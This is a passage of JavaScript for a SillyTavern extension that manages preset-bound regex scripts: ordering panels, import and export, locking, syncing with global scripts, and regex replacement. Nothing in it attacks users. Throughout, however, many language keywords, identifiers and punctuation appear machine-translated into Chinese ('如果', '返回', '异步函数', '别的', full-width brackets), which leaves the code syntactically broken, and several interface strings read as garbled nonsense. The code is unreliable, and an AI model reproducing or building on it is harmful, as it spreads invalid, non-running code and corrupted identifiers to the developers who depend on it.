    }

    // 清理全局正则表达式列表中遗留的 preset_ 条目
    const originalLength = extensions.regex.length;
    extensions.regex = extensions.regex.filter(
      s => !s.id.startsWith('preset_') && !s.scriptName?.startsWith('[s]') && !s['preset-regex'],
    ）；
    如果 (extensions.regex.length !== originalLength) {
      ctx.reloadCurrentChat();
    }

    // 将激活顺序排序按钮插入到正则表达式设置按钮区域
    const activationSortButton = $(`
      <div id="sort_activation_order" class="menu_button menu_button_icon Interactiveable" title="排序正则类型执行顺序" tabindex="0">
        <i class="fa-solid fa-arrow-down-1-9"></i>
        <small>执行顺序</small>
      </div>
    `);
    activationSortButton.on('click', async () => {
      await popupActivationSortPanel();
    });
    const targetButton = $('#import_regex');
    如果 (targetButton.length) {
      targetButton.parent().append(activationSortButton);
    }

    let presetLoaded11305 = ctx.chatCompletionSettings.preset_settings_openai;
    ctx.eventSource.on('oai_preset_changed_after', () => {
      if (ctx.chatCompletionSettings.preset_settings_openai !== presetLoaded11305) {
        presetLoaded11305 = ctx.chatCompletionSettings.preset_settings_openai;
        重新加载设置();
        取消注册所有SPresetTools();
        syncSPresetToolRegistrations();
        const stHasScripts =
          ctx.chatCompletionSettings.extensions.regex_scripts &&
          ctx.chatCompletionSettings.extensions.regex_scripts.length > 0;
        如果 (stHasScripts) {
          syncFromST();
        } else if (SPresetSettings.RegexBinding.regexes && SPresetSettings.RegexBinding.regexes.length > 0) {
          syncToST();
        }
      }
    });

    异步函数 popupActivationSortPanel() {
      const typeNames = {
        0: '全局正则',
        1: '角色卡正则',
        2: '预设条件',
      };
      let currentOrder = [...window.__regexScriptOrder];

      const popupHtml = $(`
        <div id="activation_order_sort_panel">
          <div class="regex_editor">
            <h3 class="flex-container justifyCenter">
              <strong>正则执行顺序</strong>
            </h3>
            <small class="flex-container extensions_info">
              调整不同类型正则的执行顺序。排在前面的类型优先执行。
            </small>
            <hr />
            <div id="activation_order_list" class="flex-container flexFlowColumn" style="gap: 4px;">
            </div>
          </div>
        </div>
      `);

      function renderOrderList() {
        const container = popupHtml.find('#activation_order_list');
        容器.清空();
        currentOrder.forEach((type, index) => {
          const item = $(`
            <div class="flex-container alignItemsCenter padding5" data-index="${index}" style="border: 1px solid #333; border-radius: 4px; background: rgba(42, 42, 42, 0.3);">
              <div class="flex1" style="font-weight: bold; padding: 4px 8px;">
                ${index + 1}. ${typeNames[type]}
              </div>
              <div class="flex-container flexNoGap">
                <div class="menu_button menu_button_icon activation-up ${index === 0 ? 'disabled' : ''}" data-index="${index}" title="上移">
                  <i class="fa-solid fa-chevron-up"></i>
                </div>
                <div class="menu_button menu_button_icon activation-down ${index === currentOrder.length - 1 ? 'disabled' : ''}" data-index="${index}" title="下移">
                  <i class="fa-solid fa-chevron-down"></i>
                </div>
              </div>
            </div>
          `);
          container.append(item);
        });
      }

      popupHtml.on('click', '.activation-up:not(.disabled)', function (e) {
        e.停止传播();
        const idx = parseInt($(this).data('index'));
        如果 (idx > 0) {
          [currentOrder[idx], currentOrder[idx - 1]] = [currentOrder[idx - 1], currentOrder[idx]];
          renderOrderList();
        }
      });

      popupHtml.on('click', '.activation-down:not(.disabled)', function (e) {
        e.停止传播();
        const idx = parseInt($(this).data('index'));
        如果 (idx < currentOrder.length - 1) {
          [currentOrder[idx], currentOrder[idx + 1]] = [currentOrder[idx + 1], currentOrder[idx]];
          renderOrderList();
        }
      });

      renderOrderList();

      const result = await ctx.callGenericPopup(popupHtml.get(0), ctx.POPUP_TYPE.CONFIRM, '', {
        okButton: '保存',
        cancelButton: '取消',
      });

      如果（结果）{
        window.__regexScriptOrder = currentOrder;
        如果 (!SGlobalSettings.RegexBinding) {
          SGlobalSettings.RegexBinding = {};
        }
        SGlobalSettings.RegexBinding.activationOrder = currentOrder;
        ctx.extensionSettings.SPreset = SGlobalSettings;
        ctx.saveSettingsDebounced();
        toastr.success('正则执行顺序已保存');
      }
    }

    返回;
  }

  const regexButtons = $('#open_preset_editor');
  如果 (regexButtons.length !== 0) {
    // 如果存在，则删除
    regexButtons.remove();
  }
  const oldImportButton = $('#import_regex_preset');
  如果 (oldImportButton.length !== 0) {
    oldImportButton.remove();
    $('#import_regex_preset_file').remove();
  }
  const oldSortButton = $('#sort_regexes');
  如果 (oldSortButton.length !== 0) {
    移除旧排序按钮();
  }
  const newRegexButton = $(`
    <div id="open_preset_editor" class="menu_button menu_button_icon Interactiveable" title="新的预设正则脚本" tabindex="0">
      <i class="fa-solid fa-file-circle-plus"></i>
      <small>新建默认规则</small>
    </div>
  `);
  newRegexButton.on('click', () => {
    onRegexEditorOpenClick(假);
  });
  const importButton = $(`
    <div id="import_regex_preset" class="menu_button menu_button_icon">
      <i class="fa-solid fa-file-import"></i>
      <small>导入预设则</small>
    </div>
    <input type="file" id="import_regex_preset_file" hidden accept="*.json" multiple />
  `);

  const cssStyles = `
    <style id="regex-binding-css">
      #saved_regex_scripts [id^="preset_"] {
        显示：无；
      }
    </style>
  `;
  如果 ($('#regex-binding-css').length === 0) {
    $('head').append(cssStyles);
  }
  $('#import_regex').before(importButton);
  const sortButton = $(`
    <div id="sort_regexes" class="menu_button menu_button_icon">
      <i class="fa-solid fa-sort"></i>
      <small>预设则排序</small>
    </div>
  `);
  sortButton.on('click', async () => {
    await popupSortPanel();
  });
  $('#import_regex').parent().append(sortButton);
  $('#import_regex_preset').on('click', () => {
    $('#import_regex_preset_file').click();
  });
  $('#import_regex_preset_file').on('change', async function (event) {
    const inputElement = event.target;
    for (const file of inputElement.files) {
      await onImportFile(file);
    }
    inputElement.value = '';
  });
  $('#open_regex_editor').before(newRegexButton);

  function getSelectedScripts() {
    const scripts = presetRegexes;
    const selector = '#saved_spreset_scripts .regex-script-label:has(.regex_bulk_checkbox:checked)';
    const selectedIds = $(selector)
      .map(function () {
        返回 $(this).attr('id');
      })
      。得到（）
      .filter(id => id);
    return scripts.filter(script => selectedIds.includes(script.id));
  }
  $('#bulk_enable_regex').on('click', async function () {
    const scripts = getSelectedScripts();
    如果 (scripts.length === 0) {
      返回;
    }
    for (const script of scripts) {
      脚本已禁用 = false;
    }
    await renderPresetRegexes();
    saveRegexesToPreset(presetRegexes);
    updateSTRegexes();
  });

  $('#bulk_disable_regex').on('click', async function () {
    const scripts = getSelectedScripts();
    如果 (scripts.length === 0) {
      返回;
    }
    for (const script of scripts) {
      script.disabled = true;
    }
    await renderPresetRegexes();
    saveRegexesToPreset(presetRegexes);
    updateSTRegexes();
  });

  $('#bulk_delete_regex').on('click', async function () {
    const scripts = getSelectedScripts();
    如果 (脚本长度 !== 0) {
      toastr.warning(`默认绑定则不支持批量删除`);
      返回;
    }
  });

  $('#bulk_export_regex').on('click', async function () {
    const scripts = getSelectedScripts();
    如果 (scripts.length === 0) {
      返回;
    }
    const json = JSON.stringify(scripts);
    const fileName = '默认设置-' + ctx.chatCompletionSettings.preset_settings_openai + '.json';
    download(json, fileName, 'application/json');
  });

  window.regexBinding_onSortableStop = async function () {
    尝试 {
      如果 (window.__regexBinding_isSorting === 99) {
        window.__regexBinding_isSorting = 0;
        await renderPresetRegexes();
        返回;
      }
      window.__regexBinding_isSorting = 0;
      // 深拷贝
      const oldScripts = JSON.parse(JSON.stringify(presetRegexes));
      预设正则表达式长度 = 0;
      $('#saved_spreset_scripts')
        。孩子们（）
        .each(function () {
          const id = $(this).attr('id');
          const script = oldScripts.find(s => s.id === id);
          如果（脚本）{
            presetRegexes.push(script);
          }
        });
      saveRegexesToPreset(presetRegexes);
      await renderPresetRegexes();
    } catch (error) {
      const confirm = await ctx.callGenericPopup(
        '默认绑定正则出现错误：' + error.message + '<br>点击确定复制错误信息到剪贴板<br>此时错误信息发送到原贴',
        ctx.POPUP_TYPE.CONFIRM，
      ）；
      如果（确认）{
        navigator.clipboard.writeText(JSON.stringify(error, null, 2));
        toastr.success('已复制错误信息到剪贴板');
      }
    }
  };

  window.regexBinding_onSortableStart = function () {
    window.__regexBinding_isSorting = 1;
  };

  const observer = new MutationObserver(function () {
    injectBindButtons();
  });
  const observerTarget = $('#saved_regex_scripts');
  observer.observe(observerTarget[0], {
    childList: true,
    子树：是，
  });

  renderPresetRegexes();
  同步正则表达式();
  updateSTRegexes();
  /*
  $('.regex_settings .collapse_regexes').on('click', function () {
    const icon = $(this).find('i');
    const scripts = $('#saved_spreset_scripts');
    $('.regex_settings .collapse_regexes 小').text(icon.hasClass('fa-chevron-up') ? '展开' : '收起');
    如果 (icon.hasClass('fa-chevron-up')) {
      脚本隐藏();
      icon.removeClass('fa-chevron-up');
      icon.addClass('fa-chevron-down');
    } 别的 {
      scripts.show();
      icon.removeClass('fa-chevron-down');
      icon.addClass('fa-chevron-up');
    }
  });
  */
  尝试 {
    $('#saved_spreset_scripts').sortable({
      延迟：ctx.isMobile() ? 750 : 50，
      开始：window.regexBinding_onSortableStart，
      停止:window.regexBinding_onSortableStop,
    });
    $('#saved_spreset_scripts').sortable('启用');
  } catch (error) {
    const confirm = ctx.callGenericPopup(
      '默认绑定正则出现错误：' + error.message + '<br>点击确定复制错误信息到剪贴板<br>此时错误信息发送到原贴',
      ctx.POPUP_TYPE.CONFIRM，
    ）；
    如果（确认）{
      navigator.clipboard.writeText(JSON.stringify(error, null, 2));
      toastr.success('已复制错误信息到剪贴板');
    }
  }

  let presetLoaded = SillyTavern.getContext().chatCompletionSettings.preset_settings_openai;

  ctx.eventSource.on('oai_preset_changed_after', () => {
    if (SillyTavern.getContext().chatCompletionSettings.preset_settings_openai !== presetLoaded) {
      presetLoaded = SillyTavern.getContext().chatCompletionSettings.preset_settings_openai;
      重新加载设置();
      取消注册所有SPresetTools();
      syncSPresetToolRegistrations();
      如果 (SPresetSettings.RegexBinding.regexes) {
        syncToST();
      } 别的 {
        syncFromST();
      }
    } 否则如果 (版本号 < 11305) {
      返回;
    }
    尝试 {
      const newPresetRegexes = getRegexesFromPreset();
      const oldIdOrder = presetRegexes.map(s => s.id);
      // 检查 newPresetRegexes 是否与 presetRegexes 不同
      const changed = !_.isEqual(newPresetRegexes, presetRegexes);

      /*
      如果 (!extensions.regex[MARK]) {
        reproxy(extensions, 'regex', presetRegexes);
      }
      */
      如果（已更改 || lockedRegexes.length > 0）{
        预设正则表达式长度 = 0;
        presetRegexes.push(...newPresetRegexes);
        如果 (lockedRegexes.length > 0) {
          const toAdd = [];
          for (const regex of lockedRegexes) {
            const index = presetRegexes.findIndex(s => s.id === regex.id);
            如果 (index === -1) {
              toAdd.push(regex);
            } 别的 {
              presetRegexes[index] = regex;
            }
          }
          presetRegexes.unshift(...toAdd);
        }
        saveRegexesToPreset(presetRegexes);
      }
      如果 （
        !_.isEqual(
          oldIdOrder，
          presetRegexes.map(s => s.id),
        ）
      ) {
        renderPresetRegexesSafely();
      }
      如果（已更改）{
        updateSTRegexes();
      }
    } catch (error) {
      const confirm = ctx.callGenericPopup(
        '默认绑定正则出现错误：' + error.message + '<br>点击确定复制错误信息到剪贴板<br>此时错误信息发送到原贴',
        ctx.POPUP_TYPE.CONFIRM，
      ）；
      如果（确认）{
        navigator.clipboard.writeText(JSON.stringify(error, null, 2));
        toastr.success('已复制错误信息到剪贴板');
      }
    }
  });

  function updateSTRegexes() {
    syncToST();
    如果 (版本号 >= 11305) {
      const originalLength = extensions.regex.length;
      extensions.regex = extensions.regex.filter(
        s => !s.id.startsWith('preset_') && !s.scriptName.startsWith('[s]') && !s['preset-regex'],
      ）；
      如果 (extensions.regex.length !== originalLength) {
        ctx.reloadCurrentChat();
      }
      返回;
    }
    const stRegexes = extensions.regex.slice();
    updateCss();
    let presetRegexCount = 0;
    for (stRegexes 的常量脚本) {
      如果 (script.id.startsWith('preset_')) {
        presetRegexCount++;
      }
    }
    如果 (预设正则表达式数量 !== 预设正则表达式长度) {
      const newPresetRegexes = presetRegexes.map(s => ({
        ……s，
        id: 'preset_' + s.id,
      }));
      extensions.regex = newPresetRegexes.concat(
        stRegexes.filter(s => !s.id.startsWith('preset_') && !s.scriptName.startsWith('[s]') && !s['preset-regex']),
      ）；
      ctx.reloadCurrentChat();
    } 别的 {
      presetRegexes.forEach((s, i) => {
        extensions.regex[i] = {
          ……s，
          id: 'preset_' + s.id,
        };
      });
    }
  }

  函数 syncToST() {
    如果 (版本号 >= 11305) {
      ctx.chatCompletionSettings.extensions.regex_scripts = presetRegexes;
      如果 (!extensions.preset_allowed_regex) {
        extensions.preset_allowed_regex = {};
      }
      如果 (!extensions.preset_allowed_regex.openai) {
        extensions.preset_allowed_regex.openai = [];
      }
      if (!extensions.preset_allowed_regex.openai.includes(ctx.chatCompletionSettings.preset_settings_openai)) {
        extensions.preset_allowed_regex.openai.push(ctx.chatCompletionSettings.preset_settings_openai);
      }
    }
  }

  function syncFromST() {
    如果 (版本号 >= 11305) {
      如果 (!SPresetSettings.RegexBinding.regexes) {
        SPresetSettings.RegexBinding.regexes = [];
      }
      ctx.chatCompletionSettings.extensions.regex_scripts.forEach(s => {
        if (!SPresetSettings.RegexBinding.regexes.find(s2 => s2.id === s.id)) {
          SPresetSettings.RegexBinding.regexes.push(s);
        }
      });
      renderPresetRegexes();
    }
  }

  function syncRegexes() {
    如果 （
      ctx.chatCompletionSettings.prompt_order[1] &&
      ctx.chatCompletionSettings.prompt_order[1].xiaobai_ext &&
      ctx.chatCompletionSettings.prompt_order[1].xiaobai_ext.regexBindings
    ) {
      ctx.chatCompletionSettings.prompt_order[1].xiaobai_ext.regexBindings.scripts
        .filter(s => {
          return !SPresetSettings.RegexBinding.regexes.find(s2 => s2.id === s.id);
        })
        .forEach(s => {
          presetRegexes.push(s);
        });
      ctx.chatCompletionSettings.prompt_order[1].xiaobai_ext.regexBindings = null;
    }
    如果 (ctx.chatCompletionSettings.extensions.regex_scripts) {
      ctx.chatCompletionSettings.extensions.regex_scripts
        .filter(s => {
          return !presetRegexes.find(s2 => s2.id === s.id);
        })
        .forEach(s => {
          presetRegexes.push(s);
        });
    }
    如果 (版本号 >= 11305) {
      ctx.chatCompletionSettings.extensions.regex_scripts = presetRegexes;
    }

    renderPresetRegexes();
    saveRegexesToPreset(presetRegexes);
  }

  function updateCss() {
    /*const css = `
    #${presetRegexes.map(s => `#preset_${s.id}`).join(', ')} {
      显示：无；
    }
    `;
    injectedCss.html(css);*/
    // 经过
  }

  异步函数 onImportFile(file) {
    如果 (!file) {
      toastr.error('未提供文件');
      返回;
    }
    尝试 {
      const regexScripts = JSON.parse(await getFileText(file));
      如果 (Array.isArray(regexScripts)) {
        for (const script of regexScripts) {
          await onImportScript(script);
        }
      } 别的 {
        await onImportScript(regexScripts);
      }
      toastr.success('记得保存默认设置则丢失喵');
    } catch (error) {
      toastr.error('导入文件失败');
      console.error(error);
    }
  }

  异步函数 onImportScript(script) {
    尝试 {
      如果 (!script.scriptName) {
        throw new Error('脚本名称为必填项');
      }

      // 分配一个新的ID
      script.id = ctx.uuidv4();

      presetRegexes.push(script);
      await renderPresetRegexes();

      saveRegexesToPreset(presetRegexes);
      toastr.success('已导入脚本：' + script.scriptName);
      updateSTRegexes();
    } catch (error) {
      toastr.error('导入脚本失败：' + error.message);
      console.error(error);
    }
  }

  function injectBindButtons() {
    const globalScriptBlock = $('.regex_settings').find('#saved_regex_scripts');
    const bindButtonTemplate = `
      <div class="move_to_preset menu_button可交互" data-i18n="[title]ext_regex_move_to_preset" title="绑定到默认" tabindex="0">
        <i class="fa-solid fa-arrow-up"></i>
      </div>
    `;
    globalScriptBlock.children().each(function () {
      const scriptDiv = $(this);
      const scriptId = scriptDiv.attr('id');
      const existingButton = scriptDiv.find('.move_to_preset');
      如果 (现有按钮的长度 === 0) {
        const bindButton = $(bindButtonTemplate);
        bindButton.on('click', async function () {
          const chat = await ctx.chat;
          如果（聊天时长 >= 10）{
            const confirm = await ctx.callGenericPopup(
              '当前聊天界面消息坐标，执行此操作可能停止，建议关闭当前聊天后再执行。<br>确定要继续吗？',
              ctx.POPUP_TYPE.CONFIRM，
            ）；
            如果 (!confirm) {
              返回;
            }
          }
          const script = _.remove(extensions.regex, s => s.id === scriptId)[0];
          如果 (!script) {
            toastr.error('未找到脚本');
            返回;
          }
          scriptDiv.remove();
          presetRegexes.push(script);
          await renderPresetRegexes();
          saveRegexesToPreset(presetRegexes);
          toastr.success('已绑定到默认设置，记得保存默认设置则丢失喵');
          updateSTRegexes();
        });
        scriptDiv.find('.move_to_global').before(bindButton);
      }
    });
  }

  异步函数 renderPresetRegexesSafely() {
    如果 (window.__regexBinding_isSorting) {
      window.__regexBinding_isSorting = 99;
      返回;
    }
    await renderPresetRegexes();
  }

  异步函数 renderPresetRegexes() {
    如果 (版本号 >= 11305) {
      返回;
    }
    injectBindButtons();
    updateCss();
    如果 ($('#preset_scripts_block').length > 0) {
      $('#preset_scripts_block').remove();
    }
    const regex_settings = $('.regex_settings');
    let block = injectPresetBlock(regex_settings);

    block = block.find('#saved_spreset_scripts');
    block.empty();
    presetRegexes.forEach((script, index) => renderScript(block, script, index));

    function renderScript(container, script, index) {
      const scriptHTML = `
      <div class="regex-script-label flex-container flexnowrap">
          <input type="checkbox" class="regex_bulk_checkbox" />
          <span class="drag-handle menu-handle">☰</span>
          <div class="regex_script_name flexGrow overflow-hidden"></div>
          <div class="flex-container flexnowrap">
              <label class="checkbox flex-container" for="regex_disable">
                  <input type="checkbox" name="regex_disable" class="disable_regex" />
                  <span class="regex-toggle-on fa-solid fa-toggle-on" data-i18n="[title]ext_regex_disable_script" title="禁用脚本"></span>
                  <span class="regex-toggle-off fa-solid fa-toggle-off" data-i18n="[title]ext_regex_enable_script" title="启用脚本"></span>
              </label>
              <div class="lock_regex menu_button" data-i18n="[title]ext_regex_lock_regex" title="锁定正则">
                  <i class="fa-solid fa-unlock"></i>
              </div>
              <div class="unlock_regex menu_button" data-i18n="[title]ext_regex_unlock_regex" title="解锁正则">
                  <i class="fa-solid fa-lock"></i>
              </div>
              <div class="edit_existing_regex menu_button" data-i18n="[title]ext_regex_edit_script" title="编辑脚本">
                  <i class="fa-solid fa-pencil"></i>
              </div>
              <div class="move_to_global menu_button" data-i18n="[title]ext_regex_move_to_global" title="移动到全局脚本">
                  <i class="fa-solid fa-arrow-down"></i>
              </div>
              <div class="export_regex menu_button" data-i18n="[title]ext_regex_export_script" title="导出脚本">
                  <i class="fa-solid fa-file-export"></i>
              </div>
              <div class="delete_regex menu_button" data-i18n="[title]ext_regex_delete_script" title="删除脚本">
                  <i class="fa-solid fa-trash"></i>
              </div>
          </div>
      </div>
      `;
      const scriptDiv = $(scriptHTML);

      const save = () => saveRegexScript(script, index);

      scriptDiv.attr('id', script.id);
      scriptDiv.find('.regex_script_name').text(script.scriptName);
      脚本
        .find('.disable_regex')
        .prop('checked', script.disabled ?? false)
        .on('input', async function () {
          script.disabled = !!$(this).prop('checked');
          await save();
          updateSTRegexes();
          如果 (ctx.getCurrentChatId()) {
            ctx.reloadCurrentChat();
          }
        });
      scriptDiv.find('.regex-toggle-on').on('click', function () {
        scriptDiv.find('.disable_regex').prop('checked', true).trigger('input');
      });
      scriptDiv.find('.regex-toggle-off').on('click', function () {
        scriptDiv.find('.disable_regex').prop('checked', false).trigger('input');
      });
      scriptDiv.find('.edit_existing_regex').on('click', async function () {
        await onRegexEditorOpenClick(scriptDiv.attr('id'));
      });
      if (lockedRegexes.findIndex(s => s.id === script.id) !== -1) {
        scriptDiv.find('.lock_regex').hide();
        scriptDiv.find('.unlock_regex').show();
        scriptDiv.find('.regex_script_name').text(`[锁定]${script.scriptName}`);
      } 别的 {
        scriptDiv.find('.lock_regex').show();
        scriptDiv.find('.unlock_regex').hide();
      }
      scriptDiv.find('.lock_regex').on('click', async function () {
        lockedRegexes.push(script);
        await renderPresetRegexes();
        saveLockedRegexes(lockedRegexes);
      });
      scriptDiv.find('.unlock_regex').on('click', async function () {
        _.remove(lockedRegexes, s => s.id === script.id);
        await renderPresetRegexes();
        saveLockedRegexes(lockedRegexes);
        saveRegexesToPreset(presetRegexes);
      });
      scriptDiv.find('.export_regex').on('click', async function () {
        const fileName = `regex-${sanitizeFileName(script.scriptName)}.json`;
        const fileData = JSON.stringify(script, null, 4);
        download(fileData, fileName, 'application/json');
      });
      scriptDiv.find('.move_to_global').on('click', async function () {
        const chat = await ctx.chat;
        如果（聊天时长 >= 10）{
          const confirm = await ctx.callGenericPopup(
            '当前聊天界面消息坐标，执行此操作可能停止，建议关闭当前聊天后再执行。<br>确定要继续吗？',
            ctx.POPUP_TYPE.CONFIRM，
          ）；
          如果 (!confirm) {
            返回;
          }
        }
        presetRegexes.splice(index, 1);
        如果 (版本号 >= 11305) {
          ctx.chatCompletionSettings.extensions.regex_scripts =
            ctx.chatCompletionSettings.extensions.regex_scripts.filter(s => s.id !== script.id);
        }
        const i = _.findLastIndex(extensions.regex, s => s.id.startsWith('preset_'));
        如果 (i !== -1) {
          extensions.regex.splice(i, 0, script);
        } 别的 {
          extensions.regex.unshift(script);
        }
        await renderPresetRegexes();
        saveRegexesToPreset(presetRegexes);
        updateSTRegexes();
        如果 (版本号 >= 11305) {
          ctx.reloadCurrentChat();
        }
      });
      scriptDiv.find('.delete_regex').on('click', async function () {
        const chat = await ctx.chat;
        const confirm = await ctx.callGenericPopup(
          聊天时长 >= 10
            ？ '当前聊天界面消息是否执行此操作可能结束，建议关闭当前聊天后再执行。<br>确定要删除？'
            : '你确定要删除这个吗？',
          ctx.POPUP_TYPE.CONFIRM，
        ）；
        如果 (!confirm) {
          返回;
        }
        presetRegexes.splice(index, 1);
        const i = lockedRegexes.findIndex(s => s.id === script.id);
        如果 (i !== -1) {
          lockedRegexes.splice(i, 1);
          saveLockedRegexes(lockedRegexes);
        }
        如果 (版本号 >= 11305) {
          ctx.chatCompletionSettings.extensions.regex_scripts =
            ctx.chatCompletionSettings.extensions.regex_scripts.filter(s => s.id !== script.id);
        }
        await renderPresetRegexes();
        saveRegexesToPreset(presetRegexes);
        updateSTRegexes();
      });
      scriptDiv.find('.regex_bulk_checkbox').on('change', function () {
        const checkboxes = $('#regex_container .regex_bulk_checkbox');
        const allAreChecked = checkboxes.length === checkboxes.filter(':checked').length;
        setToggleAllIcon(allAreChecked);
      });
      container.append(scriptDiv);
    }
  }
  function addScriptToGlobal(script) {
    const globalScriptBlock = $('.regex_settings').find('#saved_regex_scripts');
    const scriptHTML = `
      <div class="regex-script-label flex-container flexnowrap">
          <input type="checkbox" class="regex_bulk_checkbox" />
          <span class="drag-handle menu-handle">☰</span>
          <div class="regex_script_name flexGrow overflow-hidden"></div>
          <div class="flex-container flexnowrap">
              <label class="checkbox flex-container" for="regex_disable">
                  <input type="checkbox" name="regex_disable" class="disable_regex" />
                  <span class="regex-toggle-on fa-solid fa-toggle-on" data-i18n="[title]ext_regex_disable_script" title="禁用脚本"></span>
                  <span class="regex-toggle-off fa-solid fa-toggle-off" data-i18n="[title]ext_regex_enable_script" title="启用脚本"></span>
              </label>
              <div class="edit_existing_regex menu_button" data-i18n="[title]ext_regex_edit_script" title="编辑脚本">
                  <i class="fa-solid fa-pencil"></i>
              </div>
              <div class="move_to_global menu_button" data-i18n="[title]ext_regex_move_to_global" title="移动到全局脚本">
                  <i class="fa-solid fa-arrow-down"></i>
              </div>
              <div class="export_regex menu_button" data-i18n="[title]ext_regex_export_script" title="导出脚本">
                  <i class="fa-solid fa-file-export"></i>
              </div>
              <div class="delete_regex menu_button" data-i18n="[title]ext_regex_delete_script" title="删除脚本">
                  <i class="fa-solid fa-trash"></i>
              </div>
          </div>
      </div>
      `;
    const scriptDiv = $(scriptHTML);
    scriptDiv.attr('id', script.id);
    scriptDiv.find('.regex_script_name').text(script.scriptName);
    scriptDiv.find('.disable_regex').prop('checked', script.disabled ?? false);

    const first = globalScriptBlock.children().first();
    first.before(scriptDiv);
  }

  function download(content, fileName, contentType) {
    const a = document.createElement('a');
    const file = new Blob([content], { type: contentType });
    a.href = URL.createObjectURL(file);
    a.download = fileName;
    a.点击();
    URL.revokeObjectURL(a.href);
  }
  function setToggleAllIcon(allAreChecked) {
    const selectAllIcon = $('#bulk_select_all_toggle').find('i');
    selectAllIcon.toggleClass('fa-check-double', !allAreChecked);
    selectAllIcon.toggleClass('fa-minus', allAreChecked);
  }
  function injectPresetBlock(regex_settings) {
    尝试 {
      const htmlTemplate = `
      <div id="preset_regexes_block" class="padding5">
        <div>
          <strong data-i18n="ext_regex_preset_regexes">预设绑定规则</strong>
        </div>
        <small data-i18n="ext_regex_preset_regexes_desc">
          影响所有角色，保存在预设中。
        </small>
        <div id="saved_spreset_scripts" no-scripts-text="未找到脚本" data-i18n="[no-scripts-text]未找到脚本" class="flex-container regex-script-container flexFlowColumn"></div>
      </div>
      <hr />
      `;
      let block = regex_settings.find('#preset_regexes_block');
      如果 (block.length === 0) {
        block = $(htmlTemplate);
        const global_scripts_block = regex_settings.find('#global_scripts_block');
        global_scripts_block.before(block);
      }
      return regex_settings.find('#preset_regexes_block');
    } catch (error) {
      const confirm = ctx.callGenericPopup(
        '默认绑定正则出现错误：' + error.message + '<br>点击确定复制错误信息到剪贴板<br>此时错误信息发送到原贴',
        ctx.POPUP_TYPE.CONFIRM，
      ）；
      如果（确认）{
        navigator.clipboard.writeText(JSON.stringify(error, null, 2));
        toastr.success('已复制错误信息到剪贴板');
      }
      返回空值；
    }
  }

  const substitute_find_regex = {
    无：0，
    原始数据：1，
    逃脱：2
  };
  function sanitizeRegexMacro(x) {
    返回 x 且 x 的类型为 'string'
      ? x.replaceAll(/[\n\r\t\v\f\0.^$*+?{}[\]\\/|()]/gs, function (s) {
          开关 (s) {
            case '\n':
              返回'\n'；
            case '\r':
              返回'\\r'；
            case '\t':
              返回'\t'；
            case '\v':
              返回'\\v'；
            case '\f':
              返回'\\f'；
            case '\0':
              返回'\\0'；
            默认：
              返回 '​​\\' + s;
          }
        })
      ：x；
  }
  /**
   * 过滤掉正则表达式匹配项中需要删除的任何内容
   * @param {string} rawString 要过滤的原始字符串
   * @param {string[]} trimStrings 要修剪的字符串
   * @param {RegexScriptParams} params 正则表达式过滤器要使用的参数
   * @returns {string} 过滤后的字符串
   */
  function filterString(rawString, trimStrings, { characterOverride } = {}) {
    let finalString = rawString;
    trimStrings.forEach(trimString => {
      const subTrimString = ctx.substituteParams(trimString, undefined, characterOverride);
      finalString = finalString.replaceAll(subTrimString, '');
    });

    返回 finalString；
  }
  /**
   * 对给定字符串运行提供的正则表达式脚本
   * @param {import('./index.js').RegexScript} regexScript 要运行的正则表达式脚本
   * @param {string} rawString 要运行正则表达式脚本的字符串
   * @param {RegexScriptParams} 参数 正则表达式脚本要使用的参数
   * @returns {string} 新字符串
   * @typedef {{characterOverride?: string}} RegexScriptParams 正则表达式脚本要使用的参数
   */
  function runRegexScript(regexScript, rawString, { characterOverride } = {}) {
    let newString = rawString;
    如果 (!regexScript || !!regexScript.disabled || !regexScript?.findRegex || !rawString) {
      返回 newString；
    }

    const getRegexString = () => {
      switch (Number(regexScript.substituteRegex)) {
        case substitute_find_regex.NONE:
          返回 regexScript.findRegex；
        case substitute_find_regex.RAW:
          return ctx.substituteParamsExtended(regexScript.findRegex);
        case substitute_find_regex.ESCAPED:
          return ctx.substituteParamsExtended(regexScript.findRegex, {}, sanitizeRegexMacro);
        默认：
          console.warn(
            `runRegexScript：未知替代正则表达式值 ${regexScript.substituteRegex}。使用原始正则表达式。`
          ）；
          返回 regexScript.findRegex；
      }
    };
    const regexString = getRegexString();
    const findRegex = regexFromString(regexString);

    // 用户技能已发出。返回空值。
    如果 (!findRegex) {
      返回 newString；
    }

    // 运行替换。目前不支持 Overlay 策略
    newString = rawString.replace(findRegex, function (match) {
      const args = [...参数];
      const replaceString = regexScript.replaceString.replace(/{{match}}/gi, '$0');
      const replaceWithGroups = replaceString.replaceAll(/\$(\d+)/g, (_, num) => {
        // 获取完整匹配或捕获组
        const captureGroup = args[Number(num)];

        // 未找到匹配项 - 返回空字符串
        如果 (!captureGroup) {
          返回 '​​';
        }

        // 从匹配项中移除修剪字符串
        const filteredMatch = filterString(captureGroup, regexScript.trimStrings, { characterOverride });

        // TODO：在此处处理叠加层

        返回 filteredMatch；
      });

      // 在末尾进行替换
      返回 ctx.substituteParams(replaceWithGroups);
    });

    返回 newString；
  }

  /**
   * 打开正则表达式编辑器。
   * @param {string|boolean} existingId 现有 ID
   * @param {boolean} isScoped 脚本的作用域是否限定于某个角色？
   * @returns {Promise<void>}
   */
  async function onRegexEditorOpenClick(existingId) {
    const editorHtml = $(await ctx.renderExtensionTemplateAsync('regex', 'editor'));
    const array = presetRegexes;

    // 如果 ID 存在，则填写所有值
    let existingScriptIndex = -1;
    如果 (existingId) {
      existingScriptIndex = array.findIndex(script => script.id === existingId);
      如果 (existingScriptIndex !== -1) {
        const existingScript = array[existingScriptIndex];
        如果 (existingScript.scriptName) {
          editorHtml.find('.regex_script_name').val(existingScript.scriptName);
        } 别的 {
          toastr.error("此脚本没有名称！请删除它。");
          返回;
        }

        editorHtml.find('.find_regex').val(existingScript.findRegex || '');
        editorHtml.find('.regex_replace_string').val(existingScript.replaceString || '');
        editorHtml.find('.regex_trim_strings').val(existingScript.trimStrings?.join('\n') || []);
        editorHtml.find('input[name="disabled"]').prop('checked', existingScript.disabled ?? false);
        editorHtml.find('input[name="only_format_display"]').prop('checked', existingScript.markdownOnly ?? false);
        editorHtml.find('input[name="only_format_prompt"]').prop('checked', existingScript.promptOnly ?? false);
        editorHtml.find('input[name="run_on_edit"]').prop('checked', existingScript.runOnEdit ?? false);
        editorHtml
          .find('select[name="substitute_regex"]')
          .val(existingScript.substituteRegex ?? substitute_find_regex.NONE);
        editorHtml.find('input[name="min_depth"]').val(existingScript.minDepth ?? '');
        editorHtml.find('input[name="max_depth"]').val(existingScript.maxDepth ?? '');

